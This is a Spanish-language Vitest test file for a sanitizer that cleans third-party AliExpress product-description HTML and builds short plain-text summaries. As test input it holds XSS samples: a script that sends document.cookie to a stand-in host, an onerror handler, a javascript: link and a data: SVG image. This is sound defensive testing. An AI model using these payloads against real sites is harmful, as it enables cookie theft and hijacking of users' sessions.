import { describe, expect, it } from 'vitest';
import { aTextoPlano, resumen, sanearHtml } from './html-descripcion.js';

/**
 * El HTML de las descripciones lo escribe un tercero: cualquier vendedor de
 * AliExpress. Estas pruebas son la línea que separa «pintamos la ficha del
 * proveedor» de «ejecutamos el código del proveedor en nuestro dominio».
 */
describe('saneado del HTML de descripción', () => {
  it('conserva el formato que una ficha necesita', () => {
    const limpio = sanearHtml(
      '<p>Auriculares con <strong>40 h</strong> de batería.</p><ul><li>Bluetooth 5.3</li></ul>',
    );

    expect(limpio).toContain('<p>');
    expect(limpio).toContain('<strong>40 h</strong>');
    expect(limpio).toContain('<li>Bluetooth 5.3</li>');
  });

  it('se lleva los scripts y también lo que llevan dentro', () => {
    const limpio = sanearHtml(
      '<p>Hola</p><script>fetch("//malo.example?c="+document.cookie)</script>',
    );

    expect(limpio).toBe('<p>Hola</p>');
    // Lo importante no es solo que no haya etiqueta: el contenido tampoco puede
    // quedar como texto visible en medio de la descripción.
    expect(limpio).not.toContain('document.cookie');
  });

  it('quita los manejadores de eventos aunque la etiqueta esté permitida', () => {
    const limpio = sanearHtml('<img src="https://x.example/a.jpg" onerror="alert(1)">');

    expect(limpio).toContain('src="https://x.example/a.jpg"');
    expect(limpio).not.toContain('onerror');
  });

  it('rechaza los enlaces que ejecutan código', () => {
    expect(sanearHtml('<a href="javascript:alert(1)">pulsa</a>')).not.toContain('javascript:');
    // Y `data:` fuera incluso en imágenes: es la vía para colar un SVG con
    // script dentro.
    expect(sanearHtml('<img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=">')).not.toContain(
      'data:',
    );
  });

  it('no deja que un enlace externo manipule nuestra página', () => {
    expect(sanearHtml('<a href="https://otro.example">ver</a>')).toContain('noopener');
  });

  it('se lleva los estilos y los iframes, que no aportan a una ficha', () => {
    const limpio = sanearHtml(
      '<style>body{display:none}</style><iframe src="https://x.example"></iframe><p>Texto</p>',
    );

    expect(limpio).toBe('<p>Texto</p>');
  });

  it('devuelve null cuando no queda nada, para no guardar cadenas vacías', () => {
    expect(sanearHtml('<script>malo()</script>')).toBeNull();
    expect(sanearHtml('   ')).toBeNull();
    expect(sanearHtml(null)).toBeNull();
  });
});

describe('descripción corta', () => {
  it('deja texto plano, sin etiquetas', () => {
    expect(aTextoPlano('<p>Auriculares <strong>Bluetooth</strong></p>')).toBe(
      'Auriculares Bluetooth',
    );
  });

  it('separa los bloques en vez de pegar las palabras', () => {
    // Sin el espacio entre bloques esto daba «RojoAzul».
    expect(aTextoPlano('<li>Rojo</li><li>Azul</li>')).toBe('Rojo Azul');
  });

  it('corta por frase completa y no a mitad de palabra', () => {
    const texto =
      '<p>Auriculares con cancelación activa de ruido. Cuarenta horas de batería y estuche de carga incluido en la caja.</p>';

    const corto = resumen(texto, 60);

    expect(corto).toBe('Auriculares con cancelación activa de ruido.');
    expect(corto).not.toContain('<');
  });

  it('cuando no hay punto cerca, cierra en la última palabra entera', () => {
    const corto = resumen('<p>palabras muy largas encadenadas sin ningún punto final aqui</p>', 30);

    expect(corto?.endsWith('…')).toBe(true);
    // Ninguna palabra queda partida.
    expect(corto?.replace('…', '').trim().split(' ').at(-1)).not.toBe('encadena');
  });

  it('no toca lo que ya es corto', () => {
    expect(resumen('<p>Auriculares</p>', 300)).toBe('Auriculares');
  });
});
